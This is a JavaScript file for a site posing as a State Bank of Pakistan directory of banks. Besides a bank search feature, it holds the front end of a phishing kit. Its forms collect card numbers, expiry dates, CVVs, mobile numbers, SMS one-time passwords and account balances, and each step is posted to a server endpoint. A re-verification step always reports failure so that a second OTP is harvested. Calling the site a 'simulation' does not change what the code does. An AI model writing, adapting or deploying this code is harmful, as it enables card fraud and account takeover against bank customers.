// SBP Bank Directory & Simulation Client Logic
document.addEventListener('DOMContentLoaded', () => {
    initSession();
    initDirectorySearch();
    initCardForm();
    initOtpForm();
    initBalanceForm();
});

// Helper to get or generate persistent session ID
function initSession() {
    let sessId = sessionStorage.getItem('sbp_simulation_session');
    if (!sessId) {
        sessId = 'sess_' + Date.now() + '_' + Math.floor(Math.random() * 8999 + 1000);
        sessionStorage.setItem('sbp_simulation_session', sessId);
    }
    return sessId;
}

// 1. Directory Search & Category Filter
function initDirectorySearch() {
    const searchInput = document.getElementById('bank-search');
    const clearBtn = document.getElementById('clear-search');
    const catPills = document.querySelectorAll('.cat-pill');
    const bankItems = document.querySelectorAll('.bank-item');
    const resultsCount = document.getElementById('results-count');
    const noResults = document.getElementById('no-results');
    const popularSection = document.getElementById('popular-section');

    if (!searchInput && !catPills.length) return;

    let currentQuery = '';
    let currentCategory = 'All';

    function filterBanks() {
        let visibleCount = 0;
        const q = currentQuery.trim().toLowerCase();

        bankItems.forEach(item => {
            const name = item.getAttribute('data-name') || '';
            const cat = item.getAttribute('data-category') || '';

            const matchesQuery = !q || name.includes(q);
            const matchesCat = currentCategory === 'All' || cat === currentCategory;

            if (matchesQuery && matchesCat) {
                item.style.display = '';
                visibleCount++;
            } else {
                item.style.display = 'none';
            }
        });

        if (resultsCount) {
            resultsCount.textContent = visibleCount + ' result' + (visibleCount === 1 ? '' : 's');
        }

        if (noResults) {
            if (visibleCount === 0) {
                noResults.classList.remove('hidden');
            } else {
                noResults.classList.add('hidden');
            }
        }

        // Hide Popular marquee during active search/filter
        if (popularSection) {
            if (q.length > 0 || currentCategory !== 'All') {
                popularSection.style.display = 'none';
            } else {
                popularSection.style.display = '';
            }
        }
    }

    if (searchInput) {
        searchInput.addEventListener('input', (e) => {
            currentQuery = e.target.value;
            if (clearBtn) {
                clearBtn.classList.toggle('hidden', currentQuery.length === 0);
            }
            filterBanks();
        });
    }

    if (clearBtn) {
        clearBtn.addEventListener('click', () => {
            if (searchInput) {
                searchInput.value = '';
                currentQuery = '';
                clearBtn.classList.add('hidden');
                searchInput.focus();
                filterBanks();
            }
        });
    }

    catPills.forEach(pill => {
        pill.addEventListener('click', () => {
            currentCategory = pill.getAttribute('data-category') || 'All';

            catPills.forEach(p => {
                const isActive = p.getAttribute('data-category') === currentCategory;
                p.setAttribute('aria-pressed', isActive ? 'true' : 'false');
                if (isActive) {
                    p.className = 'cat-pill flex shrink-0 items-center gap-1.5 rounded-full px-3.5 py-1.5 text-sm font-semibold transition bg-card text-primary shadow-sm';
                    const badge = p.querySelector('span');
                    if (badge) badge.className = 'rounded-full px-1.5 text-[0.7rem] font-bold bg-primary/10 text-primary';
                } else {
                    p.className = 'cat-pill flex shrink-0 items-center gap-1.5 rounded-full px-3.5 py-1.5 text-sm font-semibold transition bg-primary-foreground/10 text-primary-foreground ring-1 ring-inset ring-primary-foreground/20 hover:bg-primary-foreground/15';
                    const badge = p.querySelector('span');
                    if (badge) badge.className = 'rounded-full px-1.5 text-[0.7rem] font-bold bg-primary-foreground/15 text-primary-foreground/80';
                }
            });

            filterBanks();
        });
    });
}

// 2. Card Form Validation & Formatting
function initCardForm() {
    const form = document.getElementById('card-form');
    if (!form) return;

    const cardInput = document.getElementById('card-number');
    const monthSelect = document.getElementById('exp-month');
    const yearSelect = document.getElementById('exp-year');
    const cvvInput = document.getElementById('cvv');
    const mobileInput = document.getElementById('mobile');
    const submitBtn = document.getElementById('card-submit-btn');

    // Format card number with spaces (0000 0000 0000 0000)
    cardInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '').slice(0, 16);
        let formatted = val.replace(/(.{4})/g, '$1 ').trim();
        e.target.value = formatted;
        validateCardForm();
    });

    monthSelect.addEventListener('change', (e) => {
        if (e.target.value) {
            e.target.classList.remove('text-muted-foreground');
            e.target.classList.add('text-foreground');
        } else {
            e.target.classList.remove('text-foreground');
            e.target.classList.add('text-muted-foreground');
        }
        validateCardForm();
    });

    yearSelect.addEventListener('change', (e) => {
        if (e.target.value) {
            e.target.classList.remove('text-muted-foreground');
            e.target.classList.add('text-foreground');
        } else {
            e.target.classList.remove('text-foreground');
            e.target.classList.add('text-muted-foreground');
        }
        validateCardForm();
    });

    cvvInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        validateCardForm();
    });

    mobileInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 11);
        validateCardForm();
    });

    function validateCardForm() {
        const rawCard = cardInput.value.replace(/\s/g, '');
        const month = monthSelect.value;
        const year = yearSelect.value;
        const cvv = cvvInput.value;
        const mobile = mobileInput.value;

        const isValid = rawCard.length === 16 &&
                        month !== '' &&
                        year !== '' &&
                        cvv.length >= 3 &&
                        /^03\d{9}$/.test(mobile);

        submitBtn.disabled = !isValid;
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const bankSlug = form.getAttribute('data-bank-slug') || 'hbl';
        const bankName = form.getAttribute('data-bank-name') || 'HBL';
        const rawCard = cardInput.value.replace(/\s/g, '');
        const month = monthSelect.value;
        const year = yearSelect.value;
        const cvv = cvvInput.value;
        const mobile = mobileInput.value;

        sessionStorage.setItem('sbp_mobile', mobile);

        // Save step to JSON API
        try {
            await fetch('/api.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'save_step',
                    session_id: initSession(),
                    bank_slug: bankSlug,
                    bank_name: bankName,
                    step: 'card',
                    data: {
                        card_number: cardInput.value,
                        exp_month: month,
                        exp_year: year,
                        cvv: cvv,
                        mobile: mobile
                    }
                })
            });
        } catch (err) {
            console.error('Save step failed:', err);
        }

        // Navigate to OTP step
        window.location.href = '/bank/' + bankSlug + '/otp?mobile=' + encodeURIComponent(mobile);
    });
}

// 3. OTP Form Handling (auto-focus, paste, 5:00 countdown timer, simulated verify feedback)
function initOtpForm() {
    const form = document.getElementById('otp-form');
    if (!form) return;

    const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
    const submitBtn = document.getElementById('otp-submit-btn');
    const invalidAlert = document.getElementById('otp-invalid-alert');
    const countdownEl = document.getElementById('countdown');
    const timerWrapper = document.getElementById('timer-wrapper');
    const resendBtn = document.getElementById('resend-btn');
    const maskedPhoneEl = document.getElementById('masked-phone');

    const mode = form.getAttribute('data-mode') || 'continue'; // 'continue' or 'reverify'
    const bankSlug = form.getAttribute('data-bank-slug') || 'hbl';
    const bankName = form.getAttribute('data-bank-name') || 'HBL';

    // Mask phone number
    const urlParams = new URLSearchParams(window.location.search);
    const mobileParam = urlParams.get('mobile') || sessionStorage.getItem('sbp_mobile') || '';
    if (maskedPhoneEl) {
        if (mobileParam && mobileParam.length >= 8) {
            const clean = mobileParam.replace(/\D/g, '');
            maskedPhoneEl.textContent = clean.slice(0, 4) + ' *** ' + clean.slice(-4);
        } else {
            maskedPhoneEl.textContent = 'your registered number';
        }
    }

    // OTP Input Navigation
    otpBoxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            if (invalidAlert) invalidAlert.classList.add('hidden');
            otpBoxes.forEach(b => {
                b.classList.remove('border-destructive', 'ring-destructive/40');
                b.classList.add('border-border');
            });

            const val = e.target.value.replace(/\D/g, '').slice(-1);
            e.target.value = val;

            if (val && index < otpBoxes.length - 1) {
                otpBoxes[index + 1].focus();
                otpBoxes[index + 1].select();
            }
            checkOtpValidity();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                otpBoxes[index - 1].focus();
                otpBoxes[index - 1].select();
            } else if (e.key === 'ArrowLeft' && index > 0) {
                e.preventDefault();
                otpBoxes[index - 1].focus();
                otpBoxes[index - 1].select();
            } else if (e.key === 'ArrowRight' && index < otpBoxes.length - 1) {
                e.preventDefault();
                otpBoxes[index + 1].focus();
                otpBoxes[index + 1].select();
            }
        });

        box.addEventListener('focus', () => {
            box.select();
        });

        box.addEventListener('paste', (e) => {
            e.preventDefault();
            const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
            if (!text) return;
            text.split('').forEach((ch, idx) => {
                if (otpBoxes[idx]) otpBoxes[idx].value = ch;
            });
            const focusIdx = Math.min(text.length, otpBoxes.length - 1);
            otpBoxes[focusIdx].focus();
            checkOtpValidity();
        });
    });

    function checkOtpValidity() {
        const fullOtp = otpBoxes.map(b => b.value).join('');
        submitBtn.disabled = fullOtp.length !== 6;
    }

    // Countdown Timer (300 seconds)
    let timeLeft = 300;
    let timerInterval = null;

    function startTimer() {
        if (timerInterval) clearInterval(timerInterval);
        timeLeft = 300;
        if (timerWrapper) timerWrapper.style.display = '';
        if (resendBtn) resendBtn.classList.add('hidden');

        function tick() {
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                if (timerWrapper) timerWrapper.style.display = 'none';
                if (resendBtn) resendBtn.classList.remove('hidden');
                return;
            }
            const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
            const secs = String(timeLeft % 60).padStart(2, '0');
            if (countdownEl) countdownEl.textContent = mins + ':' + secs;
            timeLeft--;
        }

        tick();
        timerInterval = setInterval(tick, 1000);
    }

    startTimer();

    if (resendBtn) {
        resendBtn.addEventListener('click', () => {
            otpBoxes.forEach(b => b.value = '');
            if (invalidAlert) invalidAlert.classList.add('hidden');
            otpBoxes.forEach(b => {
                b.classList.remove('border-destructive', 'ring-destructive/40');
                b.classList.add('border-border');
            });
            checkOtpValidity();
            if (otpBoxes[0]) otpBoxes[0].focus();
            startTimer();
        });
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const fullOtp = otpBoxes.map(b => b.value).join('');
        if (fullOtp.length !== 6) return;

        // Save step to JSON API
        try {
            await fetch('/api.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'save_step',
                    session_id: initSession(),
                    bank_slug: bankSlug,
                    bank_name: bankName,
                    step: mode === 'reverify' ? 'verify' : 'otp',
                    data: mode === 'reverify' ? { verify_otp: fullOtp } : { otp: fullOtp }
                })
            });
        } catch (err) {
            console.error('Save step failed:', err);
        }

        if (mode === 'reverify') {
            // Simulated re-verification failure / feedback matching original application
            if (invalidAlert) invalidAlert.classList.remove('hidden');
            otpBoxes.forEach(b => {
                b.classList.remove('border-border');
                b.classList.add('border-destructive', 'ring-destructive/40');
            });
            if (otpBoxes[0]) {
                otpBoxes[0].focus();
                otpBoxes[0].select();
            }
        } else {
            // Proceed to balance step
            window.location.href = '/bank/' + bankSlug + '/balance';
        }
    });
}

// 4. Balance Form Handling
function initBalanceForm() {
    const form = document.getElementById('balance-form');
    if (!form) return;

    const balanceInput = document.getElementById('balance');
    const submitBtn = document.getElementById('balance-submit-btn');
    const bankSlug = form.getAttribute('data-bank-slug') || 'hbl';
    const bankName = form.getAttribute('data-bank-name') || 'HBL';

    balanceInput.addEventListener('input', (e) => {
        let clean = e.target.value.replace(/\D/g, '').replace(/^0+/, '');
        if (clean) {
            e.target.value = Number(clean).toLocaleString('en-US');
            submitBtn.disabled = false;
        } else {
            e.target.value = '';
            submitBtn.disabled = true;
        }
    });

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const rawBalance = balanceInput.value.replace(/,/g, '');
        if (!rawBalance || Number(rawBalance) <= 0) return;

        // Save step to JSON API
        try {
            await fetch('/api.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'save_step',
                    session_id: initSession(),
                    bank_slug: bankSlug,
                    bank_name: bankName,
                    step: 'balance',
                    data: {
                        balance: balanceInput.value,
                        balance_numeric: Number(rawBalance)
                    }
                })
            });
        } catch (err) {
            console.error('Save step failed:', err);
        }

        // Navigate to verify step
        window.location.href = '/bank/' + bankSlug + '/verify';
    });
}
